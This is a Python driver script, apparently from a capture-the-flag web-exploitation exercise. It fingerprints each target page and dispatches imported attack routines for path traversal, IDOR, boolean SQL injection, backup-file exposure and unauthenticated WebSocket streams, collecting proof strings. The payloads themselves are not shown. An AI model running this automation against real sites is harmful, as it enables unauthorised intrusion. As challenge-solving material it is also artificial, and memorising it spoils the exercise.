#!/usr/bin/env python3
"""web-exploitation-day-22-socket-to-me mastery (release day 27) - per-target classifier.

Mastery is cumulative (docs/web-worker-lessons.md): ports rec_backup, rec_idor,
rec_lfi and rec_sqli_group_close from solver_py_scripts/recovery_lib.py
(stdlib-only, scoped to one origin each) and adds this family's own class
(rec_unauthorized_event_stream, from solve.py next to this file - needs the
`websockets` package, not stdlib).

Usage: python3 mastery.py <evidence_root> <target1_url> <target2_url> ...
Targets are positional in Target-N order (join questions[].artifact to
targets[].id yourself when building the argv list - this script does not
call the Game Master).
"""
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar
from html.parser import HTMLParser
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))  # solver_py_scripts/
import recovery_lib as rl  # rec_backup, rec_idor, rec_lfi, rec_sqli_group_close, Target, PROOF_RE

sys.path.insert(0, str(Path(__file__).resolve().parent))
from solve import rec_unauthorized_event_stream  # noqa: E402


def classify_target(url, evidence_dir):
    t = rl.Target(url, evidence_dir=evidence_dir)
    status, html = t.get("/", save="root")
    evidence_dir.joinpath("root_status.txt").write_text(str(status))

    # This family's own class first (distinguishable by /api/clues shape).
    clues_status, clues = t.get_json("/api/clues", save="clues")
    if clues_status == 200 and clues and clues.get("feature_route") and \
            clues.get("stream_reference") is not None:
        proof, param, _ = rec_unauthorized_event_stream(url, evidence_dir)
        if proof:
            return "unauthorized event stream (websocket)", proof

    if re.search(r'href="[^"]*\.php\?\w+=', html):
        proof = rl.rec_lfi(t, html)
        if proof:
            return "LFI (path traversal viewer)", proof

    if re.search(r'href="(/api/[^"]+)"', html) and re.findall(r'href="(/[a-z]+/\d+)"', html):
        proof = rl.rec_idor(t, html)
        if proof:
            return "IDOR", proof

    if re.search(r"<form[^>]*action=['\"][^'\"]*(search|lookup|explore)", html, re.I):
        proof = rl.rec_sqli_group_close(t, html)
        if proof:
            return "SQL injection (group-closing boolean)", proof

    if re.search(r"crawler polic|robots|deployment note", html, re.I):
        proof = rl.rec_backup(t)
        if proof:
            return "backup exposure", proof

    # last resorts
    if "<form" in html:
        proof = rl.rec_sqli_group_close(t, html)
        if proof:
            return "SQL injection (group-closing boolean, fallback)", proof
    proof = rl.rec_backup(t)
    return "unclassified; backup exposure fallback", proof


if __name__ == "__main__":
    evidence_root = Path(sys.argv[1])
    urls = sys.argv[2:]
    results = {}
    for i, url in enumerate(urls, start=1):
        evdir = evidence_root / f"target{i}"
        evdir.mkdir(parents=True, exist_ok=True)
        classification, proof = classify_target(url, evdir)
        print(f"Target {i}: {classification} -> {proof}")
        results[f"proof-{i}"] = {"url": url, "classification": classification, "proof": proof}
        time.sleep(0.8)
    (evidence_root / "classification.json").write_text(json.dumps(results, indent=2))
